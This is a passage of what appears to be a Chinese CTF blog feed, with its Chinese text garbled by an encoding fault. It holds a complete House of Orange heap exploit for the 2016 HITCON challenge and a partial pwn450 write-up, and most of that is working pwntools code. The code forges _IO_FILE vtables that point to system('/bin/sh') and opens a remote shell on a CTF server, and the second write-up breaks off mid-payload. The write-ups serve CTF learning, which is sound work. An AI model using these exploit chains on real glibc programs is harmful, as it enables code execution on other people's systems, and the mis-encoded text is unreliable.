ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™äº›æ–‡ä»¶æè¿°ç¬¦ä¸ç»ˆç«¯è®¾å¤‡å…³è”ï¼Œå› æ­¤ï¼Œå½“ç¨‹åºä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®æ—¶ï¼Œæ•°æ®ä¼šä»ç»ˆç«¯è¾“å…¥ï¼›å½“ç¨‹åºå‘æ ‡å‡†è¾“å‡ºå†™å…¥æ•°æ®æ—¶ï¼Œæ•°æ®ä¼šè¾“å‡ºåˆ°ç»ˆç«¯ã€‚</p><p>æˆ‘ä»¬åœ¨execå‰æŠŠæ ‡å‡†è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦ç»™å…³é—­ï¼Œç„¶åå†æ‰“å¼€.&#x2F;p4.outputæ—¶ï¼ŒUNIX ç³»ç»Ÿä» 0 å¼€å§‹å¯»æ‰¾å¯ä»¥ä½¿ç”¨çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè‡ªç„¶æ‰¾åˆ°ä¹‹å‰è¢«å…³é—­çš„æ ‡å‡†è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦ï¼Œç»™æ›¿æ¢æ‰ï¼Œå®ç°é‡å®šå‘</p><p>straceçœ‹ä¸€ä¸‹ -ff filename å°†ä¸åŒè¿›ç¨‹(å­è¿›ç¨‹)äº§ç”Ÿçš„ç³»ç»Ÿè°ƒç”¨è¾“å‡ºåˆ°filename.PIDæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; strace -ff -o task ./p4</span><br><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ls ./task*</span><br><span class="line">./task.7615  ./task.7616</span><br><span class="line"></span><br><span class="line">close(1)                                = 0</span><br><span class="line">openat(AT_FDCWD, &quot;./p4.output&quot;, O_WRONLY|O_CREAT|O_TRUNC, 0700) = 1</span><br><span class="line">newfstatat(1, &quot;&quot;, &#123;st_mode=S_IFREG|0777, st_size=17, ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">write(1, &quot; 34 114 918 p4.c\n&quot;, 17)      = 17</span><br></pre></td></tr></table></figure><p>The openat() system call operates in exactly the same way as open(2)</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2016 Hitcon House Of Orange</title>
      <link href="/2023/04/10/2016-hitcon-house-of-orange/"/>
      <url>/2023/04/10/2016-hitcon-house-of-orange/</url>
      
        <content type="html"><![CDATA[<p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1f6IBfouAMu1PFnck0vJ41Q">https://pan.baidu.com/s/1f6IBfouAMu1PFnck0vJ41Q</a><br>æå–ç ï¼šrg6j</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; checksec houseoforange_hitcon_2016 </span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/Share/ctfwiki/pwn/io_file/houseoforange_hitcon_2016&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>Upgradeé‡Œæ²¡æœ‰å’ŒåŸæ¥çš„å¤§å°åšæ¯”è¾ƒå­˜åœ¨å †æº¢å‡ºï¼Œåªèƒ½ç”³è¯·æœ€å¤šå››æ¬¡ï¼Œè€Œä¸”åªèƒ½æ›´æ–°æœ€è¿‘çš„ä¸€ä¸ªorangeï¼Œæ²¡æœ‰freeé¡¹</p><h2 id="æ³„éœ²libcå’Œheapåœ°å€"><a href="#æ³„éœ²libcå’Œheapåœ°å€" class="headerlink" title="æ³„éœ²libcå’Œheapåœ°å€"></a>æ³„éœ²libcå’Œheapåœ°å€</h2><p><code>add(0x10,b&quot;a&quot;) payload=b&#39;a&#39;*0x10+p64(0)+p64(0x21)+p64(0x1f00000001)+p64(0)*2+p64(0xfa1) edit(len(payload),payload)</code></p><p>å…ˆç”³è¯·å°å †å—ï¼Œåˆ©ç”¨æº¢å‡ºä¿®æ”¹topchunkå¤§å°ï¼Œæ³¨æ„æˆ‘ä»¬ç”³è¯·çš„ä¸‰ä¸ªå †æ˜¯ä¸­é—´çš„å †ï¼Œåˆ«å¿˜äº†é¡µå¯¹é½</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410091710000.png" alt="image-20230410091710000"></p><p><code>add(0x1000,b&#39;a&#39;)</code></p><p>ç”³è¯·çš„å¤§chunkä¼šæŠŠtopchunké“¾å…¥unsortedbinï¼Œå› ä¸ºå‰é¢ä¼šå†ç”³è¯·ä¸€ä¸ª0x10å¤§å°çš„chunkæ‰€ä»¥60å˜æˆäº†80,åé¢ä¼šå†åˆ‡å‰²ä¸€ä¸ª0x8chunkï¼Œ80å˜ä¸ºa0ï¼Œåé¢å°±ä¸ä¼šå†æäº†</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410092959397.png" alt="image-20230410092959397"></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410092846998.png" alt="image-20230410092846998"></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410091908716.png" alt="image-20230410091908716"></p><p>æˆ‘ä»¬è¿™ä¸ªæ—¶å€™å»éšä¾¿åˆ‡å‰²ä¸€å—å°±å¯ä»¥æ‹¿åˆ°main_raena+88çš„åœ°å€ï¼Œä½†æ˜¯æˆ‘ä»¬åé¢House of orangeè¿˜ä¼šç”¨åˆ°å †çš„åœ°å€</p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦åˆ©ç”¨unsortedbinçš„æœºåˆ¶ï¼Œå¦‚æœunsorted binä¸­åªæœ‰ä¸€ä¸ªchunkä¸”è¿™ä¸ªchunkæ˜¯last remainder chunkï¼Œç”³è¯·å †å—å¤§å°ä¸ºlargebinæ—¶ï¼Œä¼šå…ˆæŠŠè¿™ä¸ªchunkæ”¾åˆ°largedbiné‡Œå†åˆ‡å‰²ï¼Œè¿™ä¸ªæ—¶å€™ä¼šæœ‰fd_nextsizeå’Œbk_nextsizeçš„é“¾è¡¨ï¼Œç”±äºlargebiné‡Œåªæœ‰ä¸€ä¸ªchunkï¼Œfd_nextsizeå’Œbk_nextsizeä¼šé“¾å‘è‡ªå·±</p><p><code>add(0x400,b&#39;c&#39;)</code></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410132956019.png" alt="image-20230410132956019"></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410122608560.png" alt="image-20230410122608560"></p><p><code>show()</code>ç›´æ¥æ‰“å°æ³„éœ²libcåŸºåœ°å€</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410122710779.png" alt="image-20230410122710779"></p><p><code>edit(0x10,b&#39;a&#39;*11+b&#39;grxer&#39;)</code>æŠŠå‰16ä¸ªæ•°æ®è¦†ç›–å°±å¯ä»¥æ‰“å°å‡ºheapåœ°å€</p><h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">fake_file=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(_IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># fake_file+=b&#x27;grxer666&#x27;</span></span><br><span class="line">fake_file+=p64(heap+<span class="number">0x508</span>+<span class="number">8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(system)</span><br><span class="line">payload+=fake_file</span><br></pre></td></tr></table></figure><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410125530529.png" alt="image-20230410125530529"></p><p>æ³¨æ„ä¸€ä¸‹ç»•è¿‡ä¸€ä¸‹ä¸­é—´çš„å—</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410132008871.png" alt="image-20230410132008871"></p><p>å¸¸è§„ç»•è¿‡ä¼ªé€  IO_FILE_plus è¿™æ¬¡æˆ‘ä»¬ç›´æ¥æŠŠmodeæ”¹ä¸º0(åˆ¤æ–­æ¡ä»¶æ—¶&lt;&#x3D;å°±è¡Œ)ï¼Œå¯ä»¥ç›´æ¥ljuståˆ°0xd8ï¼Œåˆ°vtable</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_file+=p64(heap+<span class="number">0x508</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)*<span class="number">0</span>+p64(system)</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¼ªé€ ä¹Ÿå¯ä»¥æŠŠ_vtableå½“æˆæˆ‘ä»¬ç¬¬ä¸€ä¸ªjumpå‡½æ•°ï¼Œpayloadæ›´çŸ­</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_FILE_plus*)0x5555557584f0</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x60 &lt;error: Cannot access memory at address 0x60&gt;, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd2510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x5555557585d0</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_jump_t*)0x5555557585d0</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = &#123;</span></span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x0, </span><br><span class="line">  __overflow = 0x7ffff7a523a0 &lt;__libc_system&gt;, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x0, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼ªé€ å®Œæˆï¼Œå†ç”³è¯·ä¸€ä¸ªå †å—å°±å¯ä»¥è§¦å‘__overflowè°ƒç”¨é“¾</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410132625782.png" alt="image-20230410132625782"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./houseoforange_hitcon_2016&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&quot;26057&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,price=<span class="number">1</span>,color=<span class="number">1</span></span>):</span><br><span class="line">    ru(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&quot;Length of name :&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    ru(<span class="string">b&quot;Name :&quot;</span>)</span><br><span class="line">    s(name)</span><br><span class="line">    ru(<span class="string">b&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    ru(<span class="string">b&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    ru(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,name,price=<span class="number">1</span>,color=<span class="number">0xddaa</span></span>):</span><br><span class="line">    ru(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&quot;Length of name :&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    ru(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    s(name)</span><br><span class="line">    ru(<span class="string">b&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    ru(<span class="string">b&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(color).encode())</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x1f00000001</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27; house : &#x27;</span>)</span><br><span class="line">libcbase=uu64(r(<span class="number">6</span>))-<span class="number">0x3c5163</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">unsorted_bin=libcbase+<span class="number">0x68</span>+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">_IO_list_all=libcbase+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system=libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libcbase)</span><br><span class="line">p(<span class="string">&#x27;unsotr&#x27;</span>,unsorted_bin)</span><br><span class="line">p(<span class="string">&#x27;iolist&#x27;</span>,_IO_list_all)</span><br><span class="line">edit(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span>+<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;grxer&#x27;</span>)</span><br><span class="line">heap=uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">fake_file=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(_IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># fake_file+=b&#x27;grxer666&#x27;</span></span><br><span class="line">fake_file+=p64(heap+<span class="number">0x508</span>+<span class="number">8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(system)</span><br><span class="line">payload+=fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">ru(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Orange </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2016ä¸œåæ¯pwn450-note</title>
      <link href="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/"/>
      <url>/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/</url>
      
        <content type="html"><![CDATA[<p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1QEKd37yhK-vTDxViS76q5A">https://pan.baidu.com/s/1QEKd37yhK-vTDxViS76q5A</a><br>æå–ç ï¼švbek</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; checksec ./16pwn450_note </span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/ctfwiki/pwn/io_file/16pwn450_note&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>ç¨‹åºå¯ä»¥ç”³è¯·ä¸€ä¸ªæœ€å°512å †å—ï¼Œæœ€å¤§æ— é™åˆ¶</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400B3B</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+17h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = v4++;</span><br><span class="line">    *(_BYTE *)(a1 + v1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)((<span class="type">int</span>)v4 + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°å¯ä»¥æ— é™æº¢å‡ºå †å—ï¼Œç‹‚å–œ</p><h2 id="æ³„éœ²libc"><a href="#æ³„éœ²libc" class="headerlink" title="æ³„éœ²libc"></a>æ³„éœ²libc</h2><p>å”¯ä¸€ä¸€ä¸ªæ‰“å°ä¿¡æ¯çš„åœ°æ–¹æ˜¯æ‰“å°ç”³è¯·åˆ°çš„å†…å­˜åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨mmapç”³è¯·ä¸€ä¸ªå†…å­˜ï¼Œä¼šå’Œlibcæœ‰ä¸€ä¸ªå›ºå®šåç§»</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230410000002101.png" alt="image-20230410000002101"></p><p>mmapé˜ˆå€¼ä¸º128k</p><p><code>new(0x200000)#libcbase libcbase=int(rl(),16)+0x201000-0x10</code></p><p>æ‹¿åˆ°åŸºåœ°å€</p><h2 id="unsorted-bin-attack-amp-amp-house-of-orange"><a href="#unsorted-bin-attack-amp-amp-house-of-orange" class="headerlink" title="unsorted bin attack &amp;&amp; house of orange"></a>unsorted bin attack &amp;&amp; house of orange</h2><p>å› ä¸ºåªæœ‰ä¸€ä¸ªå †å—ï¼Œfreeåè‚¯å®šä¼šå’Œtopchunkåˆå¹¶ï¼Œä¸ä¼šè¿›å…¥biné‡Œï¼Œåªèƒ½åˆ©ç”¨åˆ‡å‰²topchunkæ—¶å¤§å°ä¸åˆé€‚ï¼Œå»é‡æ–°ç”³è¯·ä¸€å—å¤§å†…å­˜åŒæ—¶æŠŠoldchunkæ”¾å…¥unsortedbinï¼ŒåŒæ—¶éœ€è¦æ„é€ å¤šä¸ªunsortedbinæ‰å¯ä»¥åœ¨åˆ‡å‰²æ—¶æŠŠ0x60å¤§å°çš„biné€äººsmall binä¼ªé€ _chain</p><p><code>new(0x200) payload=b&#39;\x00&#39;*0x200+p64(0)+p64(0x10df1)</code></p><p>ç”¨æº¢å‡ºæ”¹æ‰å¤§å°ï¼Œå†freeå†ç”³è¯·ä¸€ä¸ªæ¯”è¿™ä¸ªchunkè¿˜å¤§çš„å†…å­˜ï¼ŒæŠŠè¿™ä¸ªchunkæ”¾å…¥unsortedbin</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409231152136.png" alt="image-20230409231152136"></p><p><code>new(0x200)</code></p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409231752579.png" alt="image-20230409231752579"></p><p>åˆ‡å‰²ä¸‹æ¥ä¸€å—</p><p><code>payload=b&#39;\x00&#39;*0x200+p64(0)+p64(0x10dd1)+p64(unsorted_bin)*2+b&#39;\x00&#39;*0x10db0+p64(0x10dd0)+p64(0x11) edit(payload)</code></p><p>ä¸ºäº†é˜²æ­¢é‡Šæ”¾æ—¶unlinkï¼ŒæŠŠchunkçš„ä¸‹ä¸€ä¸ªchunkçš„prevsizeå’Œprevinuseä½æ”¹æ‰ï¼Œé‡Šæ”¾åˆ°unsortedbin ä¸”ä¸åˆå¹¶</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409231532142.png" alt="image-20230409231532142"></p><p>è¿™ä¸ªæ—¶å€™å°±æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œunsortedbinæ˜¯FIFOçš„ï¼Œæ¯æ¬¡åªèƒ½ç”³è¯·ä¸€ä¸ªä¼šå¯¼è‡´ï¼Œæ¯æ¬¡æ‹¿å‡ºæ¥çš„åœ°å€æ˜¯é«˜åœ°å€ï¼Œæ²¡åŠæ³•æº¢å‡ºè¦†ç›–ä½åœ°å€çš„åœ¨unsortedé‡Œçš„å †ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å†æ¬¡ç”³è¯·<code>new(0x10d00)</code>ä¼šä»å¤§å—çš„ä»€ä¹ˆåˆ‡å‰²ï¼ŒåŒæ—¶æŠŠ0x200çš„å°å—æ”¾åˆ° small binï¼Œæ‰“ç ´è¿™ä¸ªé¡ºåºï¼Œå› ä¸ºç”³è¯·æ˜¯æ˜¯å…ˆéå†smallbins</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409231930232.png" alt="image-20230409231930232"></p><p>freeæ‰</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409232347124.png" alt="image-20230409232347124"></p><p>ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥ç”³è¯·å‡ºæ¥smallbinç„¶åé€šè¿‡æº¢å‡ºå¸ƒç½®house of orangeäº†</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409234910775.png" alt="image-20230409234910775"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10d11</span>)+p64(heap+<span class="number">0x210</span>)+p64(unsorted_bin)+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x10d10</span>-<span class="number">0x20</span>)<span class="comment">#æº¢å‡ºåˆ°ç¬¬äºŒä¸ªå—</span></span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)+p64(unsorted_bin)+p64(_IO_list_all-<span class="number">0x10</span>)<span class="comment">#å¸ƒç½®orange</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#write base</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)<span class="comment">#write ptr ç»•è¿‡æ£€æµ‹</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xc0</span>-<span class="number">48</span>) <span class="comment"># c0å¤§å°è¾¾åˆ° mode</span></span><br><span class="line">payload+=p64(<span class="number">0xffffffffffffffff</span>)<span 